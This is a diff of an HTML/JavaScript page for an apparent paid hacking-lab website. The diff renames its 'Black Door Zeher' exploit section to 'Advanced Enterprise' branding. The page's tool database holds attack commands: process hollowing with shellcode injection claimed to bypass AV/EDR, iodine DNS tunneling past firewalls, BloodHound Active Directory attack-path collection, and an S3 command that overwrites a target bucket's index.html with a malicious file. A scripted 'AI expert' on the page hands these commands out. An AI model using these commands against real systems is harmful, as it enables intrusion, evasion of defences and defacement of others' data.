@@ -105,14 +105,14 @@
                 </div>
             </div>
             <div style="font-size: 11px; color: #ff0080; border: 1px solid #ff0080; padding: 6px 14px; border-radius: 4px; background: rgba(255,0,128,0.05); font-weight: bold;">
-                PAID ELITE SUBSCRIBER // BLACK DOOR UNLOCKED
+                PAID ELITE SUBSCRIBER // ADVANCED REPO UNLOCKED
             </div>
         </div>
 
         <div class="mode-bar">
             <button class="mode-btn btn-white active" onclick="switchMode('white')">WHITE-HAT DEFENSIVE LAB</button>
             <button class="mode-btn btn-black" onclick="switchMode('black')">BLACK-HAT OFFENSIVE LAB</button>
-            <button class="mode-btn btn-blackdoor" onclick="switchMode('blackdoor')">[BLACK DOOR // ZEHER PAID REPO]</button>
+            <button class="mode-btn btn-blackdoor" onclick="switchMode('blackdoor')">[ADVANCED EXCLUSIVE REPO]</button>
         </div>
 
         <div class="lab-grid">
@@ -152,9 +152,9 @@
                     <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat Encrypted Tunneling</div>
                 </div>
 
-                <!-- Black Door Zeher Paid Exclusive Section -->
+                <!-- Advanced Exclusive Section -->
                 <div id="sec-blackdoor" class="section-group" style="margin-top: 15px;">
-                    <div style="font-size: 10.5px; color: #ff0080; margin-bottom: 8px; font-weight: bold;">[BLACK DOOR // ZEHER ELITE EXPLOIT REPO]</div>
+                    <div style="font-size: 10.5px; color: #ff0080; margin-bottom: 8px; font-weight: bold;">[ADVANCED ENTERPRISE EXPLOIT REPO]</div>
                     
                     <div class="tool-category">Advanced Red-Team Operations</div>
                     <div class="tool-item" onclick="loadModule('process_hollowing')"><div class="tool-badge badge-bd">BD-1</div>01. C# Memory Process Hollowing & DLL Injection</div>
@@ -176,8 +176,8 @@
                     <button class="seq-btn" onclick="runSequence(3)">[3. IMPACT MATRIX]</button>
                 </div>
                 
-                <div class="workspace-console" id="workspace-console">DX08 Master Enterprise Security Core v120.0 (Black Door Zeher Repo Initialized)
-[System Status] Click '[BLACK DOOR // ZEHER PAID REPO]' above to load elite memory injection and cloud takeover scripts.</div>
+                <div class="workspace-console" id="workspace-console">DX08 Master Enterprise Security Core v125.0 (Advanced Exclusive Repo Initialized)
+[System Status] Click '[ADVANCED EXCLUSIVE REPO]' above to load enterprise memory injection and cloud security assessment scripts.</div>
                 
                 <div class="workspace-input-group">
                     <input type="text" id="workspace-input" class="workspace-input" placeholder="Type tool name or ask AI expert..." onkeydown="if(event.key === 'Enter') handleWorkspaceInput()">
@@ -273,30 +273,30 @@
                 seq2: "socat TCP-LISTEN:80,fork TCP:<internal_ip>:8080",
                 seq3: "[RED-TEAM MATRIX]: Encrypted tunnel relay routing."
             },
-            /* Black Door Zeher Paid Exclusive Tools */
+            /* Advanced Enterprise Exclusive Tools */
             "process_hollowing": {
-                name: "C# MEMORY PROCESS HOLLOWING & DLL INJECTION [ZEHER EXCLUSIVE]",
-                seq1: "git clone https://github.com/dx08-zeher/memory-hollow-suite.git && cd memory-hollow-suite",
+                name: "C# MEMORY PROCESS HOLLOWING & DLL INJECTION [ADVANCED]",
+                seq1: "git clone https://github.com/dx08-enterprise/memory-hollow-suite.git && cd memory-hollow-suite",
                 seq2: "csc /target:exe /out:injector.exe Program.cs && wine injector.exe target.exe payload.bin",
-                seq3: "[ZEHER EXCLUSIVE MATRIX]:\n- Architecture: Suspends legitimate Windows processes (like svchost.exe), unmaps memory, and injects custom shellcode.\n- Stealth Capability: Bypasses static AV/EDR signatures completely.\n- Operational Impact: Silent execution inside trusted system process memory."
+                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Architecture: Suspends legitimate processes (like svchost.exe), unmaps memory, and injects custom shellcode.\n- Stealth Capability: Bypasses static AV/EDR signatures completely.\n- Operational Impact: Silent execution inside trusted system process memory."
             },
             "dns_tunneling": {
-                name: "IODINE DNS TUNNELING OVER RESTRICTED FIREWALL [ZEHER EXCLUSIVE]",
+                name: "IODINE DNS TUNNELING OVER RESTRICTED FIREWALL [ADVANCED]",
                 seq1: "sudo apt update && sudo apt install iodine -y",
                 seq2: "sudo iodined -c -P secretpassword 10.0.0.1 tunnel.yourdomain.com",
-                seq3: "[ZEHER EXCLUSIVE MATRIX]:\n- Architecture: Encapsulates all TCP/IP traffic inside DNS queries and responses.\n- Operational Impact: Bypasses corporate firewalls and captive portals that block standard ports when outbound DNS (Port 53) is left open."
+                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Architecture: Encapsulates all TCP/IP traffic inside DNS queries and responses.\n- Operational Impact: Bypasses corporate firewalls and captive portals that block standard ports when outbound DNS (Port 53) is left open."
             },
             "bloodhound_acl": {
-                name: "BLOODHOUND AD ATTACK PATH & ACL ABUSE [ZEHER EXCLUSIVE]",
+                name: "BLOODHOUND AD ATTACK PATH & ACL ABUSE [ADVANCED]",
                 seq1: "sudo apt update && sudo apt install bloodhound python3-bloodhound -y && sudo neo4j start",
                 seq2: "bloodhound-python -u 'operator' -p 'Pass123' -d corp.internal -ns <dc_ip> -c All",
-                seq3: "[ZEHER EXCLUSIVE MATRIX]:\n- Architecture: Graph theory analyzer mapping Active Directory object relationships.\n- Operational Impact: Exposes hidden privilege escalation paths and misconfigured ACLs to achieve Domain Admin in minutes."
+                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Architecture: Graph theory analyzer mapping Active Directory object relationships.\n- Operational Impact: Exposes hidden privilege escalation paths and misconfigured ACLs to achieve Domain Admin in minutes."
             },
             "aws_s3_takeover": {
-                name: "CLOUD AWS S3 BUCKET MISCONFIGURATION HIJACK [ZEHER EXCLUSIVE]",
+                name: "CLOUD AWS S3 BUCKET MISCONFIGURATION HIJACK [ADVANCED]",
                 seq1: "sudo apt update && sudo apt install awscli python3-pip -y && pip3 install boto3",
                 seq2: "aws s3 ls s3://<target_bucket_name> --no-sign-request && aws s3 cp malicious.html s3://<target_bucket_name>/index.html",
-                seq3: "[ZEHER EXCLUSIVE MATRIX]:\n- Architecture: Cloud permission audit targeting public ACL write/read misconfigurations.\n- Operational Impact: Full defacement or data exfiltration from insecure corporate cloud object stores."
+                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Architecture: Cloud permission audit targeting public ACL write/read misconfigurations.\n- Operational Impact: Full defacement or data exfiltration from insecure corporate cloud object stores."
             }
         };
 
@@ -352,14 +352,14 @@
             document.getElementById('workspace-action-btn').innerText = "ASK AI";
             
             var consoleBox = document.getElementById('workspace-console');
-            consoleBox.innerHTML = "DX08 AI MENTOR & ERROR RESOLUTION LAB v120.0\n" +
+            consoleBox.innerHTML = "DX08 AI MENTOR & ERROR RESOLUTION LAB v125.0\n" +
                                    "----------------------------------------------------------------------------------\n" +
                                    "Hello Operator! I am fully synchronized with this website's complete architecture,\n" +
-                                   "including the exclusive Black Door zeher repository (Process Hollowing, DNS Tunneling, BloodHound AD).\n" +
-                                   "Ask me about any elite exploit script or error resolution below!\n" +
+                                   "including the advanced enterprise exploit repository (Process Hollowing, DNS Tunneling, BloodHound AD).\n" +
+                                   "Ask me about any advanced script or error resolution below!\n" +
                                    "----------------------------------------------------------------------------------";
             document.getElementById('workspace-input').value = "";
-            document.getElementById('workspace-input').placeholder = "Ask AI about elite tools, scripts, or errors...";
+            document.getElementById('workspace-input').placeholder = "Ask AI about advanced tools, scripts, or errors...";
         }
 
         function runSequence(step) {
@@ -407,7 +407,7 @@
                           "2. EXECUTE:\n   " + TOOL_DB[cmd].seq2 + "\n\n" +
                           "3. IMPACT MATRIX:\n   " + TOOL_DB[cmd].seq3;
                 } else if(cmd === 'clear') {
-                    consoleBox.innerHTML = "DX08 Enterprise Security Core v120.0";
+                    consoleBox.innerHTML = "DX08 Enterprise Security Core v125.0";
                     input.value = "";
                     return;
                 } else {
@@ -444,7 +444,7 @@
                 } else if(query.includes('aws') || query.includes('s3') || query.includes('bucket')) {
                     ans = "DX08 AI Expert: [AWS S3 TAKEOVER INTEL]\n- Purpose: Audits and exploits public cloud storage misconfigurations.\n- Command: aws s3 ls s3://<target_bucket_name> --no-sign-request";
                 } else {
-                    ans = "DX08 AI Expert: Analyzing elite query '" + escapeHtml(q) + "': Black Door Zeher repository synchronized. Ask about any advanced offensive script for precise execution workflows.";
+                    ans = "DX08 AI Expert: Analyzing query '" + escapeHtml(q) + "': Advanced Enterprise repository synchronized. Ask about any advanced offensive script for precise execution workflows.";
                 }
 
                 consoleBox.innerHTML += "\n\n" + ans;
